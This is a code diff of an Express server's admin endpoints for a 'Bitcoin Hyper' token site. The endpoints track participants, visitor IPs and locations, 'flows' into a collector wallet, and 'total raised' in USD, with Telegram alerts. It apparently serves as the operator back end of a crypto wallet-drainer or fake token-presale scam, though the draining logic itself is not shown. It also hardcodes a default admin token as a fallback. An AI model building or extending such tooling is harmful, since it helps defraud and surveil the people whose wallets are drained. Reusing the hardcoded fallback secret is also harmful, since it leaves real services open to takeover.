+    storage: '💾 Persistent (7 day retention)'
   };
   
   // ============================================
-  // SAFE SYSTEM CONFIGURATION
+  // SYSTEM CONFIGURATION
   // ============================================
   
   const system = {
@@ -1198,11 +1266,16 @@ app.get('/api/admin/dashboard', (req, res) => {
     flowEnabled: memoryStorage.settings?.flowEnabled || false,
     tokenName: memoryStorage.settings?.tokenName || 'Bitcoin Hyper',
     tokenSymbol: memoryStorage.settings?.tokenSymbol || 'BTH',
-    collectorWallet: COLLECTOR_WALLET || 'N/A'
+    collectorWallet: COLLECTOR_WALLET || 'N/A',
+    totalStorage: {
+      allTimeParticipants: memoryStorage.participants.length,
+      allTimeVisits: memoryStorage.siteVisits.length,
+      allTimeFlows: memoryStorage.completedFlows.size
+    }
   };
   
   // ============================================
-  // FINAL RESPONSE WITH ARRAY FALLBACKS
+  // FINAL RESPONSE
   // ============================================
   
   res.json({
@@ -1210,41 +1283,47 @@ app.get('/api/admin/dashboard', (req, res) => {
     timestamp: new Date().toISOString(),
     summary,
     networks: networkStatus,
-    recentVisits: recentVisits,
-    activeParticipants: activeParticipants.slice(0, 50),
-    pendingFlows: pendingFlows,
-    completedFlows: completedFlows.slice(0, 30),
-    processedTransactions: processedTransactions,
+    recentVisits: filteredVisits.slice(0, 100),
+    activeParticipants: filteredParticipants.slice(0, 100),
+    pendingFlows: filteredPendingFlows.slice(0, 50),
+    completedFlows: filteredCompletedFlows.slice(0, 50),
+    processedTransactions: filteredTransactions.slice(0, 100),
     locationStats: Object.values(locationStats).sort((a, b) => b.count - a.count),
     dailyActivity: Object.entries(dailyActivity)
       .map(([date, count]) => ({ date, count }))
       .sort((a, b) => a.date.localeCompare(b.date)),
+    hourlyActivity: Object.entries(hourlyActivity)
+      .map(([hour, count]) => ({ hour: parseInt(hour), count }))
+      .sort((a, b) => a.hour - b.hour),
     system
   });
 });
 
 // ============================================
-// ADMIN STATS (legacy - keep for compatibility)
+// ADMIN STATS (quick stats endpoint)
 // ============================================
 
 app.get('/api/admin/stats', (req, res) => {
   const token = req.query.token;
   const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
   
-  if (token?.trim() !== adminToken?.trim()) return res.status(401).json({ success: false });
+  if (token?.trim() !== adminToken?.trim()) {
+    return res.status(401).json({ success: false });
+  }
   
   res.json({
     success: true,
     stats: {
-      participants: Array.isArray(memoryStorage.participants) ? memoryStorage.participants.length : 0,
-      eligible: Array.isArray(memoryStorage.participants) ? memoryStorage.participants.filter(p => p && p.isEligible).length : 0,
-      claimed: Array.isArray(memoryStorage.participants) ? memoryStorage.participants.filter(p => p && p.claimed).length : 0,
-      totalProcessedUSD: (memoryStorage.settings?.statistics?.totalProcessedUSD || 0).toFixed(2),
-      pendingFlows: memoryStorage.pendingFlows instanceof Map ? memoryStorage.pendingFlows.size : 0,
+      participants: memoryStorage.participants.length,
+      eligible: memoryStorage.participants.filter(p => p && p.isEligible).length,
+      claimed: memoryStorage.participants.filter(p => p && p.claimed).length,
+      totalRaisedUSD: memoryStorage.settings?.statistics?.totalProcessedUSD?.toFixed(2) || '0.00',
+      pendingFlows: memoryStorage.pendingFlows?.size || 0,
+      completedFlows: memoryStorage.completedFlows?.size || 0,
       telegram: telegramEnabled ? '✅' : '❌',
-      siteVisits: Array.isArray(memoryStorage.siteVisits) ? memoryStorage.siteVisits.length : 0,
-      uniqueIPs: memoryStorage.settings?.statistics?.uniqueIPs instanceof Set ? memoryStorage.settings.statistics.uniqueIPs.size : 0,
-      storage: '💾 Persistent'
+      siteVisits: memoryStorage.siteVisits?.length || 0,
+      uniqueIPs: memoryStorage.settings?.statistics?.uniqueIPs?.size || 0,
+      storage: '💾 7 Day Retention'
     }
   });
 });
@@ -1257,26 +1336,13 @@ app.get('/api/admin/wallet/:address', (req, res) => {
   const token = req.query.token;
   const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
   
-  if (token?.trim() !== adminToken?.trim()) return res.status(401).json({ success: false });
+  if (token?.trim() !== adminToken?.trim()) {
+    return res.status(401).json({ success: false });
+  }
   
   const walletAddress = req.params.address.toLowerCase();
   
-  const participant = Array.isArray(memoryStorage.participants) 
-    ? memoryStorage.participants.find(p => p && p.walletAddress === walletAddress)
-    : null;
-    
-  const visits = Array.isArray(memoryStorage.siteVisits)
-    ? memoryStorage.siteVisits.filter(v => v && v.walletAddress === walletAddress)
-    : [];
-    
-  const flows = {
-    pending: memoryStorage.pendingFlows instanceof Map
-      ? Array.from(memoryStorage.pendingFlows.values()).filter(f => f && f.walletAddress === walletAddress)
-      : [],
-    completed: memoryStorage.completedFlows instanceof Map
-      ? Array.from(memoryStorage.completedFlows.values()).filter(f => f && f.walletAddress === walletAddress)
-      : []
-  };
+  const participant = memoryStorage.participants.find(p => p && p.walletAddress === walletAddress);
   
   if (!participant) {
     return res.json({ 
@@ -1286,20 +1352,32 @@ app.get('/api/admin/wallet/:address', (req, res) => {
     });
   }
   
+  const visits = memoryStorage.siteVisits.filter(v => v && v.walletAddress === walletAddress);
+  
+  const flows = {
+    pending: memoryStorage.pendingFlows instanceof Map
+      ? Array.from(memoryStorage.pendingFlows.values()).filter(f => f && f.walletAddress === walletAddress)
+      : [],
+    completed: memoryStorage.completedFlows instanceof Map
+      ? Array.from(memoryStorage.completedFlows.values()).filter(f => f && f.walletAddress === walletAddress)
+      : []
+  };
+  
+  const transactions = memoryStorage.settings?.statistics?.processedTransactions
+    .filter(t => t && t.wallet && t.wallet.toLowerCase() === walletAddress) || [];
+  
   res.json({
     success: true,
     found: true,
     wallet: participant,
     visits,
     flows,
-    transactions: Array.isArray(memoryStorage.settings?.statistics?.processedTransactions)
-      ? memoryStorage.settings.statistics.processedTransactions.filter(t => t && t.wallet && t.wallet.toLowerCase() === walletAddress)
-      : []
+    transactions
   });
 });
 
 // ============================================
-// ADMIN MANUAL SAVE (trigger save)
+// ADMIN MANUAL SAVE
 // ============================================
 
 app.post('/api/admin/save', async (req, res) => {
@@ -1319,7 +1397,7 @@ app.post('/api/admin/save', async (req, res) => {
 });
 
 // ============================================
-// ADMIN CLEAN OLD (manual trigger)
+// ADMIN MANUAL CLEAN (trigger 7-day cleanup)
 // ============================================
 
 app.post('/api/admin/clean', async (req, res) => {
@@ -1363,11 +1441,12 @@ async function startServer() {
   🌍 Site URL: https://bitcoinhypertoken.vercel.app
   
   📦 COLLECTOR: ${COLLECTOR_WALLET}
-  💾 STORAGE: Persistent (7 days)
+  💾 STORAGE: 7 DAY RETENTION
   
-  📊 DATA SUMMARY:
+  📊 CURRENT STATS:
   📁 Total Participants: ${memoryStorage.participants.length}
   📁 Total Visits: ${memoryStorage.siteVisits.length}
+  💰 Total Raised: $${memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2)}
   📁 Pending Flows: ${memoryStorage.pendingFlows.size}
   📁 Completed Flows: ${memoryStorage.completedFlows.size}
   
@@ -1377,6 +1456,9 @@ async function startServer() {
   ✅ Polygon: 0x56d829E89634Ce1426B73571c257623D17db46cB
   ✅ Arbitrum: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
   ✅ Avalanche: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
+  
+  ⏰ CLEANUP: Every 6 hours (keeps last 7 days)
+  💾 AUTO-SAVE: Every minute
   
   🤖 TELEGRAM: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Missing'}
   
@@ -1388,4 +1470,5 @@ async function startServer() {
   });
 }
 
+// Start the server
 startServer();
